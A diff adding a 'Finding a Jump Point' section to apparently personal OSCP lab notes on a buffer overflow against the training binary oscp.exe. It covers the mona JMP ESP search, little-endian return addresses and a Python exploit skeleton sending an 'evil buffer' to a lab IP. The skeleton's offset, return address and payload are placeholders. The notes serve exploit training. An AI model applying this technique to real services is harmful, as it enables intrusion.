@@ -246,7 +246,61 @@ except:
     5. Restart `oscp.exe` in `Immunity Debugger` and run the `overflow1_step3_findBadchars.py` script again. 
     
     6. **Repeat the badchar comparison until the results status returns `Unmodified`. This indicates that no more badchars exist.** 
+
+--- 
+
+### 4. Finding a Jump Point
+
+- With the `oscp.exe` either **running or in a crashed state**, run the following `mona` command...
+
+    - **Making sure to update the `-cpb` option with all the `badchars` you identified (including `\x00`)**:
+
+        - `!mona jmp -r esp -cpb "\x00"`
+
+    - This command finds all `JMP ESP` (or equivalent) instructions with addresses that don't contain any of the badchars specified. 
+    
+    - The results should display in the `Log data` window (use the Window menu to switch to it if needed).
+
+    - Choose an address and update your python script with the new `overflow1_step4_findJumpPoint.py` script.
+    
+        - Set the `retn` variable to the `address`, written `"special backwards"` (since the system is `little endian`). 
         
+            - **For example:**
+            
+                - If the address is `\x01\x02\x03\x04` 
+                
+                - in Immunity, write it as `\x04\x03\x02\x01` in your exploit.
+
+```python
+import socket
+
+ip = "10.10.56.134"
+port = 1337
+
+prefix = "OVERFLOW1 "
+offset = 0
+overflow = "A" * offset
+retn = "BBBB"
+padding = ""
+payload = "necesito poner algo aqui weyyyyyyyyyyyyy"
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending evil buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
+except:
+  print("Could not connect.")
+```
+
+---
+
+### Generate Payload
         
 
 ---
